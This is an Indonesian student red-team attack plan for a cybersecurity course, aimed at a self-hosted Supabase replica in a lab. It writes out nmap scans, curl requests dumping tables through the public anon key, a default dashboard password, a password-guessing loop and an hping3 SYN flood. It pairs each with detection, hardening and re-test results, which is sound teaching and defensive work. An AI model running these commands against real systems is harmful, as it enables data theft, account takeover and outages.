# Attack Plan Fase 2 - Red Team

**Mata Kuliah:** TEK1314 - Keamanan Siber
**Kelompok:** 6 Kelas B, Tim Red Team
**Standar:** Panduan PBL Bagian IX (min. 3 skenario, min. 2 kategori berbeda; DoS maks. 1 dari 3)
**Target:** Target Node REPLIKA (self-hosted Supabase) di lab, BUKAN `*.supabase.co` asli
**Path repo:** `docs/redteam/attack_plan.md`

---

## Prinsip

Seluruh skenario menyasar Target Node replika, yaitu stack Supabase self-hosted
di VM lab. Serangan tidak pernah menyentuh Supabase Cloud milik Mitra, dan
seluruh data yang dipakai adalah data dummy. Tool disebut eksplisit sejak tahap
rencana supaya Blue Team dapat menyiapkan deteksi yang relevan (Bagian IX
ketentuan tambahan no. 1).

## Lingkungan lab

Topologi tiga segmen (lihat [ip_plan](../design/ip_plan.md)), diwujudkan di
KVM dengan host sebagai router dan mirror lewat `tc` ke Security Onion:

- Attacker Node (Kali): 10.6.6.10. Kursi Red Team.
- Target Node (Ubuntu 24.04 + Docker + Supabase self-hosted): 172.16.6.10.
- Monitoring Node (Security Onion): 192.168.6.10, NIC monitor tanpa IP.

Permukaan serang di Target Node pada kondisi default (rapuh), dari recon nyata:

- 22/tcp: SSH (OpenSSH 9.6)
- 8000/tcp: gateway Envoy (satu-satunya pintu API; PostgREST, GoTrue, Studio di baliknya)
- 5432/tcp dan 6543/tcp: Supavisor (pooler Postgres) yang ikut terekspos

Catatan: gerbang API di versi Supabase yang terpasang adalah Envoy, bukan Kong.
PostgREST (3000) dan GoTrue (9999) tidak terekspos langsung; keduanya dijangkau
lewat Envoy di 8000. Semua perintah di bawah dijalankan dari Kali (10.6.6.10).

---

## Skenario 1 - Reconnaissance dan enumerasi layanan

**Kategori:** Reconnaissance
**Teknik:** pemindaian port dan versi layanan.
**Tool:** `nmap` (`-sV`), opsional Wireshark.

```
nmap -Pn -sV -T4 -p 22,3000,5432,6543,8000,8443,9999 172.16.6.10
```

**Hasil kondisi rapuh:** 22, 5432, 6543, dan 8000 terbuka; 3000/8443/9999 tertutup
karena di balik gateway. Bukti: [evidence/s1-nmap-before.txt](../blueteam/evidence/s1-nmap-before.txt).

**Deteksi Blue Team:** alert port scan di Security Onion (Zeek/Suricata).
**Target celah (Minggu 4):** pooler Postgres (5432/6543) terekspos tanpa firewall.

---

## Skenario 2 - Data exfiltration lewat REST API

**Kategori:** Web/API
**Teknik:** menyalahgunakan endpoint PostgREST di balik Envoy. Karena Row Level
Security belum aktif dan anon key bersifat publik, seluruh isi tabel bisa ditarik
tanpa otorisasi.
**Tool:** `curl` dengan anon key, opsional Burp Suite atau OWASP ZAP.

```
curl -s "http://172.16.6.10:8000/rest/v1/sensor_readings?select=*" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

curl -s "http://172.16.6.10:8000/rest/v1/profiles?select=*" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"
```

**Hasil kondisi rapuh:** seluruh baris `sensor_readings` tumpah, dan tabel
`profiles` membocorkan data pengguna lengkap dengan email dan nomor HP. Ini celah
paling khas Supabase. Bukti: [evidence/s2-exfil-before.json](../blueteam/evidence/s2-exfil-before.json).

**Deteksi Blue Team:** lonjakan request `/rest/v1/*` dengan `select=*` di log gateway.
**Target celah (Minggu 4):** RLS belum aktif (ditutup kontrol C1 di `hardening_plan.md`).

---

## Skenario 3 - Brute force dan kredensial default

**Kategori:** Exploitation / Akses
**Teknik:** menguji kredensial default dashboard (basic auth via gateway) dan
menebak login pada endpoint Auth (GoTrue).
**Tool:** `curl`, `hydra`, opsional Nmap NSE `http-brute`.

```
# Kredensial default dashboard
curl -i -u "supabase:this_password_is_insecure_and_should_be_updated" \
  http://172.16.6.10:8000/

# Brute force kecil ke endpoint login GoTrue
for p in admin password 123456 supabase rahasia; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    "http://172.16.6.10:8000/auth/v1/token?grant_type=password" \
    -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@sahirafarm.id\",\"password\":\"$p\"}"
done
```

**Hasil kondisi rapuh:** kredensial default dashboard diterima (HTTP 307 redirect,
bukan 401 tolak), dan tidak ada rate limit. Bukti:
[evidence/s3-brute-before.txt](../blueteam/evidence/s3-brute-before.txt).

**Deteksi Blue Team:** banyak percobaan login gagal (trigger fail2ban / signature Suricata).
**Target celah (Minggu 4):** kredensial default dashboard (A4) dan tidak ada rate limit (A3).

---

## (Opsional) Skenario 4 - SYN flood ke gateway

**Kategori:** Availability (maks. 1 skenario, hanya pelengkap)
**Teknik:** SYN flood sederhana pada gateway Envoy di 8000, skala lab terkontrol, durasi singkat.
**Tool:** `hping3`.

```
hping3 -S --flood -p 8000 172.16.6.10
```

**Deteksi Blue Team:** alert anomali volume SYN di Security Onion.

---

## Pemenuhan ketentuan Bagian IX

| Ketentuan | Status |
|---|---|
| Minimal 3 skenario | 3 wajib (S1 sampai S3) + 1 opsional (S4) |
| Minimal 2 kategori berbeda | Reconnaissance, Web/API, Exploitation, plus Availability |
| DoS bukan satu-satunya | DoS hanya opsional pelengkap (S4) |
| Tool disebut eksplisit | nmap, curl, hydra, Burp/ZAP, hping3 |
| Menyasar Target Node replika | semua ke self-host 172.16.6.10, bukan cloud asli |
| Dikaitkan celah Minggu 4 | tiap skenario punya baris Target celah |

---

## Pemetaan ke Purple Team Loop (Bagian X)

Tiap skenario melewati lima tahap: Serang (baseline), Deteksi, Analisis, Respons
(mitigasi Blue Team), dan Verifikasi (serangan diulang, kini gagal). Mitigasi
sudah dipetakan di `hardening_plan.md`:

- S1 ditutup B1 (UFW) dan B2 (pooler ke loopback).
- S2 ditutup C1 (RLS) dan C3 (least privilege DB).
- S3 ditutup A4 (ganti kredensial default), A3 (rate limit), A1/A2 (SSH hardening).

### Bukti verifikasi (sudah dijalankan di lab)

Serangan diulang setelah hardening (bukti di folder `../blueteam/evidence/`):

- S1: port terbuka menyusut dari {22, 5432, 6543, 8000} menjadi {22, 8000}; 5432
  dan 6543 menjadi filtered.
- S2: anon key tidak lagi bisa membaca tabel. Respons menjadi HTTP 401 "permission
  denied for table sensor_readings" dan "permission denied for table profiles".
- S3: kredensial default dashboard dibalas HTTP 401 (sebelumnya 307).

Skrip serangan siap pakai ada di `scripts/phase-2/attack/`.
